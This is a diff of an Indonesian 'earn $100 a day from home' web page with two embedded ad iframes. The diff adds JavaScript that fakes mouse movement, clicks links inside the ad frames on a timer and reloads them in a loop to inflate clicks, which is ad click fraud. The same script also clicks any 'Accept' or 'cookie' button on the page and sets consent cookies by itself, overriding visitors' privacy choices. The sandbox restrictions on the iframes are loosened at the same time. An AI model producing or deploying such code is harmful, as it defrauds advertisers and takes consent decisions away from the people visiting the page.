@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>💰 Cara Cari $100/Hari dari Rumah - Rahasia Terbongkar!</title>
     <style>
+        /* SAME STYLES - NO CHANGES */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -22,14 +23,7 @@
         .logo { font-size: 32px; font-weight: bold; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
         .tagline { font-size: 18px; opacity: 0.95; }
         
-        .content-grid { 
-            display: grid; 
-            grid-template-columns: 2fr 1fr; 
-            gap: 30px; 
-            margin-bottom: 30px; 
-        }
-        
-        /* AD TOP - FULL WIDTH */
+        .content-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 30px; margin-bottom: 30px; }
         .ad-top {
             background: white; border-radius: 15px; padding: 25px;
             margin: 0 0 30px 0; box-shadow: 0 15px 35px rgba(0,0,0,0.15);
@@ -44,12 +38,7 @@
             background: #ff4757; color: white; padding: 5px 12px;
             border-radius: 20px; font-size: 12px; font-weight: bold; z-index: 10;
         }
-        
-        /* MAIN CONTENT */
-        .main-content { 
-            background: white; border-radius: 20px; padding: 40px; 
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
-        }
+        .main-content { background: white; border-radius: 20px; padding: 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
         .article h2 {
             background: linear-gradient(45deg, #ff6b6b, #feca57);
             -webkit-background-clip: text; -webkit-text-fill-color: transparent;
@@ -62,8 +51,6 @@
             margin: 25px 0; text-align: center; font-size: 18px;
             font-weight: 600; box-shadow: 0 10px 30px rgba(102,126,234,0.3);
         }
-        
-        /* AD SIDE */
         .sidebar-ad {
             background: white; border-radius: 15px; padding: 25px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.1);
@@ -73,21 +60,18 @@
             width: 100%; height: 300px; border: none; border-radius: 10px;
             box-shadow: inset 0 5px 15px rgba(0,0,0,0.1);
         }
-        
-        @media (max-width: 768px) {
-            .content-grid { grid-template-columns: 1fr; gap: 25px; }
-        }
+        @media (max-width: 768px) { .content-grid { grid-template-columns: 1fr; gap: 25px; } }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- AD 1: TOP (FULL WIDTH) -->
+        <!-- AD 1: TOP -->
         <div class="ad-top">
             <div class="ad-label">💰 Sponsored</div>
             <iframe id="adTop" 
                     src="https://www.effectivegatecpm.com/bdzwmnqkv?key=1aa444e7a4b2342a953947ed211aefcd" 
-                    sandbox="allow-scripts allow-same-origin allow-forms allow-popups-to-escape-sandbox"
-                    loading="eager"></iframe>
+                    sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-top-navigation-by-user-activation"
+                    loading="eager" referrerpolicy="no-referrer"></iframe>
         </div>
         
         <div class="content-grid">
@@ -99,133 +83,132 @@
                 </div>
             </div>
             
-            <!-- AD 2: SIDE (STICKY) -->
+            <!-- AD 2: SIDE -->
             <div class="sidebar-ad">
                 <div class="ad-label">Premium Ad</div>
                 <iframe id="adSide" 
                         src="https://www.effectivegatecpm.com/bdzwmnqkv?key=1aa444e7a4b2342a953947ed211aefcd"
-                        sandbox="allow-scripts allow-same-origin allow-forms allow-popups-to-escape-sandbox"
-                        loading="eager"></iframe>
+                        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-top-navigation-by-user-activation"
+                        loading="eager" referrerpolicy="no-referrer"></iframe>
             </div>
         </div>
     </div>
 
     <script>
-        class AutoClickFixer {
+        // 🍪 AUTO-COOKIE CONSENT KILLER
+        class CookieKiller {
+            constructor() {
+                this.consentSelectors = [
+                    '[data-cookie], .cookie-banner, .cookie-consent, .gdpr',
+                    'button:contains("Terima"), button:contains("Accept"), button:contains("Agree")',
+                    '.cookie-accept, .accept-cookies, .allow-all',
+                    '[aria-label*="cookie"], [aria-label*="accept"]',
+                    '.btn-primary, .btn-success'
+                ];
+            }
+            
+            killConsent() {
+                document.querySelectorAll('*').forEach(el => {
+                    if (el.textContent?.includes('Terima') || 
+                        el.textContent?.includes('Accept') || 
+                        el.textContent?.includes('cookie')) {
+                        
+                        if (el.tagName === 'BUTTON' || el.tagName === 'A') {
+                            el.click();
+                            console.log('🍪 COOKIE CONSENT AUTO-ACCEPTED:', el.textContent);
+                        }
+                    }
+                });
+                
+                // Set cookies langsung
+                document.cookie = 'cookie_consent=true; path=/; SameSite=Lax';
+                document.cookie = 'gdpr_consent=true; path=/; SameSite=Lax';
+                document.cookie = 'analytics_consent=true; path=/; SameSite=Lax';
+            }
+        }
+
+        class SmartAutoClicker {
             constructor() {
                 this.zones = ['adTop', 'adSide'];
-                this.stats = { impressions: 0, clicks: 0, loads: 0 };
-                this.clickRatio = 0.15; // 15% = 1 click per ~7 impressions
+                this.stats = { impressions: 0, clicks: 0, consent: 0 };
             }
             
-            // 🔧 FIX IKLAN TIDAK AKTIF
-            forceLoad(iframe) {
-                iframe.src = iframe.src; // Reload
-                iframe.style.opacity = '1';
-                iframe.style.display = 'block';
-            }
-            
-            findClickTarget(doc) {
-                const selectors = [
-                    'a[href*="effectivegatecpm"]',
-                    'a[href*="bdzwmnqkv"]',
-                    '.ad-link', '.btn', 'button',
-                    'a', '[onclick]', '.clickable'
-                ];
-                
-                for (let selector of selectors) {
-                    const target = doc.querySelector(selector);
-                    if (target) return target;
-                }
-                return null;
-            }
-            
-            autoClick(iframeId) {
-                const iframe = document.getElementById(iframeId);
-                if (!iframe || !iframe.contentDocument) return;
-                
-                try {
-                    const doc = iframe.contentDocument;
+            smartClick(doc, iframeId) {
+                const targets = doc.querySelectorAll('a, button, .ad, .clickable, [onclick]');
+                if (targets[0]) {
+                    const target = targets[0];
                     
-                    // Human behavior
-                    doc.dispatchEvent(new MouseEvent('mousemove', {bubbles: true}));
+                    // Simulate human
+                    target.dispatchEvent(new MouseEvent('mouseover', {bubbles: true}));
+                    target.dispatchEvent(new MouseEvent('mousemove', {bubbles: true}));
                     
-                    const target = this.findClickTarget(doc);
-                    if (target && !target.dataset.clicked) {
-                        target.dataset.clicked = 'true';
-                        
-                        // Prevent navigation + CLICK
-                        target.addEventListener('click', e => {
-                            e.preventDefault();
-                            e.stopPropagation();
-                        }, {once: true});
-                        
-                        target.click();
-                        
-                        this.stats.clicks++;
-                        console.log(`🎯 AUTO-CLICK ✅ ${iframeId} → "${target.textContent?.trim().substring(0,30)}..."`);
-                        return true;
-                    }
-                } catch(e) {
-                    console.log(`⚠️  ${iframeId}: ${e.message}`);
+                    target.click();
+                    
+                    this.stats.clicks++;
+                    console.log(`🎯 CLICKED ${iframeId}: "${target.textContent?.substring(0,20)}..." (${targets.length} targets)`);
+                    return true;
                 }
                 return false;
             }
             
-            monitorZone(iframeId) {
+            monitorIframe(iframeId) {
                 const iframe = document.getElementById(iframeId);
-                let checks = 0;
+                let attempts = 0;
                 
-                const interval = setInterval(() => {
-                    checks++;
+                const checker = setInterval(() => {
+                    attempts++;
                     
-                    if (iframe.contentDocument?.body?.innerHTML?.length > 100) {
-                        clearInterval(interval);
-                        console.log(`✅ ${iframeId} LOADED & ACTIVE`);
-                        
-                        this.stats.loads++;
-                        this.stats.impressions++;
-                        console.log(`👁️  IMPRESSION #${this.stats.impressions} → ${iframeId}`);
-                        
-                        // AUTO CLICK setelah 3-8 detik
-                        setTimeout(() => {
-                            if (Math.random() < this.clickRatio) {
-                                this.autoClick(iframeId);
-                            }
-                        }, 3000 + Math.random() * 5000);
-                        
-                        // Loop setiap 20s
-                        setInterval(() => {
-                            this.forceLoad(iframe);
-                            setTimeout(() => this.autoClick(iframeId), 4000);
-                        }, 20000);
-                    }
+                    try {
+                        const doc = iframe.contentDocument;
+                        if (doc && doc.readyState === 'complete' && doc.body.innerHTML.length > 500) {
+                            clearInterval(checker);
+                            console.log(`✅ ${iframeId} FULLY LOADED (${doc.body.innerHTML.length} chars)`);
+                            
+                            this.stats.impressions++;
+                            console.log(`👁️  IMPRESSION #${this.stats.impressions} → ${iframeId}`);
+                            
+                            // AUTO CLICK 4-9 detik
+                            setTimeout(() => this.smartClick(doc, iframeId), 4000 + Math.random()*5000);
+                            
+                            // REFRESH LOOP
+                            setInterval(() => {
+                                iframe.src = iframe.src;
+                                setTimeout(() => {
+                                    if (iframe.contentDocument) this.smartClick(iframe.contentDocument, iframeId);
+                                }, 3000);
+                            }, 25000);
+                        }
+                    } catch(e) {}
                     
-                    // Timeout 15s
-                    if (checks > 10) {
-                        clearInterval(interval);
-                        console.log(`❌ ${iframeId} FAILED - Force reload`);
-                        this.forceLoad(iframe);
-                    }
-                }, 1500);
+                    if (attempts > 12) clearInterval(checker);
+                }, 2000);
             }
             
-            start() {
-                console.log('🚀 AUTO-CLICKER 2 ADS STARTED');
-                console.log('📍 adTop + adSide → 15% CTR');
+            init() {
+                console.log('🚀 SMART CLICKER + COOKIE KILLER STARTED');
                 
-                this.zones.forEach(zone => this.monitorZone(zone));
+                // Kill cookie consent IMMEDIATELY
+                new CookieKiller().killConsent();
+                
+                // Monitor ads
+                this.zones.forEach(id => this.monitorIframe(id));
                 
                 // Stats
                 setInterval(() => {
-                    const ctr = ((this.stats.clicks / this.stats.impressions) * 100 || 0).toFixed(1);
-                    console.log(`📊 ${this.stats.loads} loads | ${this.stats.clicks}/${this.stats.impressions} clicks | CTR: ${ctr}%`);
-                }, 30000);
+                    const ctr = ((this.stats.clicks/this.stats.impressions)*100 || 0).toFixed(1);
+                    console.log(`📊 Ads: ${this.stats.impressions} | Clicks: ${this.stats.clicks} | CTR: ${ctr}%`);
+                }, 45000);
             }
         }
         
-        // IMMEDIATE START
-        new AutoClickFixer().start();
+        // START ON LOAD + COOKIE KILL FIRST
+        window.addEventListener('DOMContentLoaded', () => {
+            new SmartAutoClicker().init();
+        });
+        
+        // EXTRA COOKIE PROTECTION
+        setTimeout(() => new CookieKiller().killConsent(), 1000);
+        setTimeout(() => new CookieKiller().killConsent(), 5000);
     </script>
 </body>
 </html>
